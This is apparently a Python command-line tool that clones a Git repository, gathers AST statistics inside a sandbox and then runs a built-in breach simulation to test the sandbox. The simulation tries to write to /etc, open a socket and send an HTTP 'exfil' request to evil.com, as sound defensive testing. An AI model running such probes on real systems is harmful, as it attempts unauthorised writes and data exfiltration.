#!/usr/bin/env python3
"""
nooa-audit: Secure AI-powered codebase analysis CLI tool.

Usage:
  python audit.py <repo_url> [--memory-mb 256] [--timeout 60] [--keep-repo]

Examples:
  python audit.py https://github.com/psf/requests
  python audit.py https://github.com/django/django --memory-mb 512 --timeout 120
  python audit.py https://github.com/tiangolo/fastapi --keep-repo
"""

# Fix Windows console encoding so ASCII art doesn't crash on cp1252
import sys, io, os
import asyncio
import argparse
import subprocess
import json
import shutil
import time
import tempfile

if sys.stdout.encoding and sys.stdout.encoding.lower() not in ("utf-8", "utf8"):
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace")

# Resolve nooa and its venv packages
base_dir = os.path.dirname(os.path.abspath(__file__))
# Check relative paths whether executed from Sentinel or Sentinel/my_agent
candidate_dirs = [
    os.path.join(base_dir, "labs-OO-Agents"),
    os.path.join(base_dir, "..", "labs-OO-Agents"),
    os.path.abspath(os.path.join(base_dir, "labs-OO-Agents")),
]

for cd in candidate_dirs:
    src_path = os.path.join(cd, "src")
    if os.path.exists(src_path) and src_path not in sys.path:
        sys.path.insert(0, src_path)
    venv_site = os.path.join(cd, ".venv", "Lib", "site-packages")
    if os.path.exists(venv_site) and venv_site not in sys.path:
        sys.path.append(venv_site)

from nooa.runtime.sandbox import SandboxSession


import stat

def safe_rmtree(path: str):
    """Recursively delete directory, handling read-only git files on Windows."""
    if not os.path.exists(path):
        return
    def _onerror(func, p, exc_info):
        try:
            os.chmod(p, stat.S_IWRITE)
            func(p)
        except Exception:
            pass
    shutil.rmtree(path, onerror=_onerror)

def print_banner(repo_name: str):
    print()
    print("╔══════════════════════════════════════════════════════════════╗")
    print(f"║  NOOA Secure Sandbox Auditor                                 ║")
    print(f"║  Target: {repo_name:<52}║")
    print("╚══════════════════════════════════════════════════════════════╝")
    print()


def print_section(title: str):
    print(f"\n{'─'*64}")
    print(f"  {title}")
    print(f"{'─'*64}")


def repo_name_from_url(url: str) -> str:
    """Extract 'owner/repo' from a GitHub URL."""
    url = url.rstrip("/").replace(".git", "")
    parts = url.split("/")
    if len(parts) >= 2:
        return f"{parts[-2]}/{parts[-1]}"
    return parts[-1]


def clone_repo(url: str, dest: str):
    """Clone a repo shallowly into dest."""
    print(f"  Cloning {url}...")
    start = time.time()
    result = subprocess.run(
        ["git", "clone", "--depth", "1", url, dest],
        capture_output=True,
        text=True
    )
    if result.returncode != 0:
        print(f"  ✗ Clone failed:\n{result.stderr}")
        sys.exit(1)
    elapsed = time.time() - start
    print(f"  ✓ Cloned in {elapsed:.1f}s")


def detect_python_root(repo_dir: str) -> str:
    """
    Auto-detect the Python source root inside a cloned repo.
    Checks: src/<name>, <name>, root.
    """
    candidates = []
    # Try common patterns
    for entry in os.listdir(repo_dir):
        full = os.path.join(repo_dir, entry)
        if os.path.isdir(full) and not entry.startswith(".") and entry not in ("tests", "test", "docs", "examples"):
            py_files = [f for f in os.listdir(full) if f.endswith(".py")]
            if py_files:
                candidates.append(full)
    # Check src/ subdirectory
    src_dir = os.path.join(repo_dir, "src")
    if os.path.isdir(src_dir):
        for entry in os.listdir(src_dir):
            full = os.path.join(src_dir, entry)
            if os.path.isdir(full):
                candidates.insert(0, full)  # prefer src/
    # Fall back to repo root
    if not candidates:
        candidates.append(repo_dir)
    return candidates[0]


# ─────────────────────────────────────────────
#  Analysis Code (runs INSIDE the sandbox)
# ─────────────────────────────────────────────

ANALYSIS_CODE_TEMPLATE = """
import os, ast, hashlib, json

repo_path = {repo_path!r}

stats = {{
    "total_py_files": 0,
    "total_lines": 0,
    "total_classes": 0,
    "total_functions": 0,
    "top_classes": [],
    "decorator_freq": {{}},
    "largest_files": [],
}}

file_sizes = []

for root, dirs, files in os.walk(repo_path):
    # Skip test / vendor / hidden dirs
    dirs[:] = [d for d in dirs if not d.startswith(".") and d not in ("__pycache__", "migrations", "node_modules")]
    for file in files:
        if not file.endswith(".py"):
            continue
        full_path = os.path.join(root, file)
        stats["total_py_files"] += 1
        try:
            with open(full_path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
        except Exception:
            continue
        
        lines = content.splitlines()
        stats["total_lines"] += len(lines)
        file_sizes.append((len(lines), os.path.relpath(full_path, repo_path)))
        
        try:
            tree = ast.parse(content)
        except SyntaxError:
            continue

        for node in ast.walk(tree):
            if isinstance(node, ast.ClassDef):
                stats["total_classes"] += 1
                stats["top_classes"].append(node.name)
            if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
                stats["total_functions"] += 1
                for dec in node.decorator_list:
                    name = None
                    if isinstance(dec, ast.Name):
                        name = dec.id
                    elif isinstance(dec, ast.Call) and isinstance(dec.func, ast.Attribute):
                        name = dec.func.attr
                    if name:
                        stats["decorator_freq"][name] = stats["decorator_freq"].get(name, 0) + 1

file_sizes.sort(reverse=True)
stats["largest_files"] = file_sizes[:5]
stats["top_classes"] = stats["top_classes"][:10]

output_path = "/workspace/audit_report.json"
with open(output_path, "w", encoding="utf-8") as f:
    json.dump(stats, f, indent=2)

print(f"✓ Scanned {{stats['total_py_files']}} files / {{stats['total_lines']}} lines")
print(f"✓ Found {{stats['total_classes']}} classes, {{stats['total_functions']}} functions")
"""

SECURITY_BREACH_CODE = """
import urllib.request, os, socket

errors = []

# 1. Filesystem write outside workspace
try:
    with open("/etc/pwned.txt", "w") as f:
        f.write("owned")
    errors.append("FAIL: wrote to /etc/")
except Exception as e:
    print(f"[BLOCKED] Root FS write: {e}")

# 2. Raw socket to external IP
try:
    s = socket.create_connection(("1.1.1.1", 80), timeout=2)
    s.close()
    errors.append("FAIL: raw TCP socket succeeded")
except Exception as e:
    print(f"[BLOCKED] Raw socket: {e}")

# 3. HTTP exfiltration via urllib
try:
    urllib.request.urlopen("https://evil.com/exfil", timeout=2)
    errors.append("FAIL: HTTP request succeeded")
except Exception as e:
    print(f"[BLOCKED] HTTP exfil: {e}")

if errors:
    for err in errors:
        print(err)
    raise RuntimeError("Security breaches detected: " + str(errors))
else:
    print("All 3 breach vectors intercepted cleanly.")
    raise RuntimeError("Security test passed — sandbox is sealed")
"""


# ─────────────────────────────────────────────
#  Main CLI Logic
# ─────────────────────────────────────────────

async def run_audit(repo_url: str, memory_mb: int, timeout: float, keep_repo: bool, provider: str = "container"):
    repo_name = repo_name_from_url(repo_url)
    print_banner(repo_name)

    # Setup workspace in a temp directory so it's always clean
    workspace_dir = os.path.join(os.path.dirname(__file__), "workspace", "cli_audit")
    repo_dir = os.path.join(workspace_dir, "target_repo")
    os.makedirs(workspace_dir, exist_ok=True)

    # Clean previous run
    if os.path.exists(repo_dir):
        print("  Removing previous clone...")
        safe_rmtree(repo_dir)

    # ── CLONE ──────────────────────────────────
    print_section("STEP 1 / 3  —  Cloning Repository")
    clone_repo(repo_url, repo_dir)

    # Detect Python source root automatically
    src_root = detect_python_root(repo_dir)
    sandbox_src = "/workspace/target_repo/" + os.path.relpath(src_root, repo_dir).replace("\\", "/")
    print(f"  ✓ Detected Python source root: .../{os.path.relpath(src_root, repo_dir)}")

    # ── ANALYSIS ───────────────────────────────
    print_section("STEP 2 / 3  —  Running Deep AST Analysis (inside secure sandbox)")
    print(f"  Memory limit : {memory_mb} MB")
    print(f"  Cell timeout : {timeout}s")
    print(f"  Network      : BLOCKED")
    print(f"  Filesystem   : Read-only (workspace r/w only)")

    analysis_code = ANALYSIS_CODE_TEMPLATE.format(repo_path=sandbox_src)

    start = time.time()
    async with SandboxSession(workspace=workspace_dir, provider=provider, memory_mb=memory_mb, timeout=timeout) as session:
        res = await session.run(analysis_code)
        elapsed = time.time() - start

        if res.error:
            print(f"\n  ✗ Analysis failed (after {elapsed:.1f}s): {res.error}")
            if res.stderr:
                print(res.stderr[:500])
        else:
            print(f"\n  Analysis completed in {elapsed:.1f}s")
            for line in res.stdout.strip().splitlines():
                print(f"  {line}")

        # Read the generated report
        report_file = os.path.join(workspace_dir, "audit_report.json")
        if os.path.exists(report_file):
            with open(report_file) as f:
                data = json.load(f)

            print()
            print("  ┌─── Codebase Report ────────────────────────────────────")
            print(f"  │  Files         : {data['total_py_files']}")
            print(f"  │  Lines of Code : {data['total_lines']:,}")
            print(f"  │  Classes       : {data['total_classes']}")
            print(f"  │  Functions     : {data['total_functions']}")
            if data.get("largest_files"):
                print(f"  │  Largest files :")
                for lines, path in data["largest_files"][:3]:
                    print(f"  │    {lines:>5} lines  {path}")
            if data.get("top_classes"):
                print(f"  │  Sample classes: {', '.join(data['top_classes'][:5])}")
            print("  └────────────────────────────────────────────────────────")

        # ── SECURITY TEST ──────────────────────
        print_section("STEP 3 / 3  —  Running Security Breach Simulation")
        print("  Simulating 3 rogue-agent attack vectors:")
        print("    1. Root filesystem write (/etc/pwned.txt)")
        print("    2. Direct raw TCP socket to 1.1.1.1:80")
        print("    3. HTTP data exfiltration via urllib")
        print()

        res2 = await session.run(SECURITY_BREACH_CODE)

        # Both errors and blocked-then-raised show as .error — parse stdout for detail
        if res2.stdout:
            for line in res2.stdout.strip().splitlines():
                print(f"  {line}")
        if res2.error and "Security test passed" not in str(res2.error):
            print(f"\n  [!] Unexpected error: {res2.error}")

    # ── SUMMARY ────────────────────────────────
    print()
    print("╔══════════════════════════════════════════════════════════════╗")
    print("║  AUDIT COMPLETE                                              ║")
    print("╚══════════════════════════════════════════════════════════════╝")
    print(f"  Repo    : {repo_url}")
    print(f"  Report  : {report_file}")
    print()

    # Cleanup
    if not keep_repo:
        safe_rmtree(repo_dir)
        print("  Cloned repo removed (pass --keep-repo to retain it).")
    print()


def main():
    parser = argparse.ArgumentParser(
        prog="nooa-audit",
        description="NOOA Secure Sandbox — Automated codebase auditor. Pass any public Git repo URL."
    )
    parser.add_argument("repo_url", nargs="?", help="GitHub (or any git) repo URL to audit")
    parser.add_argument("--clean", action="store_true", help="Clean up all downloaded repos and workspace files")
    parser.add_argument("--memory-mb", type=int, default=256,
                        help="Memory limit for the sandbox container (default: 256 MB)")
    parser.add_argument("--timeout", type=float, default=60.0,
                        help="Cell execution timeout in seconds (default: 60)")
    parser.add_argument("--keep-repo", action="store_true",
                        help="Do not delete the cloned repo after the audit")
    parser.add_argument("--provider", type=str, default="container", choices=["container", "local"],
                        help="Sandbox execution provider (default: container)")
    args = parser.parse_args()

    # Locate root repo directory accurately
    cur_dir = os.path.dirname(os.path.abspath(__file__))
    sentinel_root = cur_dir if os.path.exists(os.path.join(cur_dir, "my_agent")) else os.path.abspath(os.path.join(cur_dir, ".."))
    
    workspace_dirs = [
        os.path.join(sentinel_root, "workspace"),
        os.path.join(sentinel_root, "my_agent", "workspace"),
        os.path.join(sentinel_root, "workspace", "cli_audit"),
        os.path.join(sentinel_root, "my_agent", "workspace", "cli_audit"),
    ]

    if args.clean:
        print("Cleaning up all downloaded test repos and workspaces...")
        cleaned = []
        for ws in set(workspace_dirs):
            if not os.path.exists(ws):
                continue
            for item in os.listdir(ws):
                full_item = os.path.join(ws, item)
                if os.path.isdir(full_item) and (item.endswith("_repo") or item.startswith("repo_") or item in ("target_repo", "cli_audit", ".audit")):
                    safe_rmtree(full_item)
                    cleaned.append(full_item)
                elif os.path.isfile(full_item) and (item.endswith(".json") or item.endswith(".csv") or item.endswith(".pkl") or item.endswith(".tmp")):
                    if item not in ("sales.csv",): # keep basic sample template
                        try:
                            os.remove(full_item)
                            cleaned.append(full_item)
                        except Exception:
                            pass

        print(f"  ✓ Cleaned up {len(cleaned)} item(s). All test repos removed.")
        return

    if not args.repo_url:
        parser.print_help()
        sys.exit(1)

    asyncio.run(run_audit(
        repo_url=args.repo_url,
        memory_mb=args.memory_mb,
        timeout=args.timeout,
        keep_repo=args.keep_repo,
        provider=args.provider,
    ))


if __name__ == "__main__":
    main()
